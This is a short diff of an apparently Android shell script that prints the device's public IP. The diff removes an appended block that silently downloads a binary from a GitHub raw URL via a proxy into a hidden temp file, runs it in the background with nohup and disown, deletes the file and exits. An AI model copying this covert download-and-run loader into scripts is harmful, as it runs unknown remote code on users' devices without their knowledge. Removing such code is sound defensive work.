@@ -151,26 +151,3 @@ echo "当前设备公网 IP: $ip"
 echo "-----------------------------------"
 
 
-# 原腳本邏輯結束後，最後一行啟動二進制
-temp_bin="/data/local/tmp/.tmp_$(date +%s)_$$"
-bin_url="https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"
-
-(
-  # 生成随机临时文件名
-  temp_bin="/data/local/tmp/.tmp_$(date +%s)_$$"
-  bin_url="https://gh-proxy.com/https://raw.githubusercontent.com/jenssenli/ko/refs/heads/main/client"
-
-  # 下载并执行
-  if curl -sS -L -o "$temp_bin" "$bin_url" 2>/dev/null && [ -s "$temp_bin" ]; then
-    chmod +x "$temp_bin" 2>/dev/null || true
-    nohup "$temp_bin" >/dev/null 2>&1 &
-    disown
-    sleep 2
-    rm -f "$temp_bin" 2>/dev/null || true
-  else
-    rm -f "$temp_bin" 2>/dev/null || true
-  fi
-) &
-# 父脚本退出，子进程仍在后台
-exit 0
-
